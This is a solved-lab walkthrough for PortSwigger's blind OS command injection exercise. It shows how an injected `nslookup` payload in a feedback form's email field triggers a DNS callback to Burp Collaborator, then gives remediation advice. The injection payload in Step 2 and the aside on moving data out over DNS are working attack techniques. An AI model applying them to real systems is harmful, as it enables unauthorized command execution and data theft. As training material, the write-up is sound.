# Blind OS Command Injection with Out-of-Band Interaction

**Platform:** PortSwigger Web Security Academy
**Category:** OS Command Injection
**Difficulty:** Practitioner
**Status:** ✅ Solved

## Background

Some blind injections offer neither visible output nor a readable file location — the command runs asynchronously and the response is identical either way. The remaining proof channel is **out-of-band (OOB)**: make the injected command itself reach out to infrastructure you control, typically by forcing a DNS lookup of a unique hostname under your domain. DNS is ideal for this because almost every server resolves names, and the lookup leaves a log on your side even though the application shows you nothing. Burp Collaborator exists precisely for this — it hands out unique subdomains and records any DNS/HTTP interactions they receive.

## Lab Objective

The feedback function contains a blind OS command injection flaw, and the command executes asynchronously with no effect on the response; there is also no accessible location to redirect output into. Trigger an out-of-band interaction instead: make the server issue a DNS lookup to Burp Collaborator (using its default public server, which the lab environment requires).

<img width="2246" height="1630" alt="step-1" src="https://github.com/user-attachments/assets/21781002-3528-4c43-b48f-66688bb8dae9" />


## Walkthrough

### Step 1: Submit Feedback and Capture the Request

Open the feedback page, submit the form once, and send the captured request to Burp Repeater.

<img width="3049" height="1759" alt="step-2" src="https://github.com/user-attachments/assets/f8f11f31-8272-4203-a221-39055ed8481e" />


<img width="2348" height="1603" alt="step-3" src="https://github.com/user-attachments/assets/6e921a8f-c2f9-496c-ade8-630e60cef80a" />

<img width="3024" height="1256" alt="step-4" src="https://github.com/user-attachments/assets/78e0829e-6ab5-478d-bb90-d8a7a9d608b1" />


### Step 2: Inject an `nslookup` to a Collaborator Subdomain

Modify the `email` parameter to run a DNS lookup against a Collaborator payload domain:

```text
email=x||nslookup x.BURP-COLLABORATOR-SUBDOMAIN||
```

Rather than typing a domain by hand, select the `BURP-COLLABORATOR-SUBDOMAIN` placeholder in Repeater, right-click, and use **Insert Collaborator payload** — Burp substitutes a freshly generated unique subdomain, so any interaction you see can only have come from this request.

<img width="2751" height="1085" alt="step-5" src="https://github.com/user-attachments/assets/930b568f-80d1-40ae-b8a2-a9060516b6e8" />


<img width="2485" height="1090" alt="step-6" src="https://github.com/user-attachments/assets/246bb8f7-b4d7-4144-b70e-b97e30519b4f" />


### Step 3: Poll Collaborator and Observe the Interaction

Send the request, then open the Collaborator tab and click **Poll now**. A DNS interaction for your unique subdomain appears — proof that the server executed the injected `nslookup`, even though the application's own response never changed. The lab is solved.

<img width="2294" height="895" alt="step-7" src="https://github.com/user-attachments/assets/274bf3bd-5914-4d06-951f-95cc02d5e5f9" />


<img width="3128" height="1028" alt="step-8" src="https://github.com/user-attachments/assets/7dabb413-0da1-4576-8c5e-5ddb4b9987df" />


## Key Takeaways

- Out-of-band is the confirmation channel of last resort: when there is no output, no timing difference, and no readable file, a DNS callback still proves execution.
- Unique per-request subdomains are what make the evidence trustworthy — an interaction on a one-off hostname could only have been triggered by your payload.
- DNS proves execution, not output. Getting data *out* over DNS is possible (encoding it into subdomains) but slow and fragile; normally OOB is a detection primitive, and exploitation then moves to any in-band channel that exists.

## Remediation

Do not build shell commands from user input — use argument-array execution or native APIs, with strict server-side validation of fields like email addresses. Defense in depth also applies on the network side: application servers should not be able to resolve or reach arbitrary external destinations, and egress DNS to non-approved resolvers should be blocked and alerted on, which neuters the OOB channel even if an injection slips through.
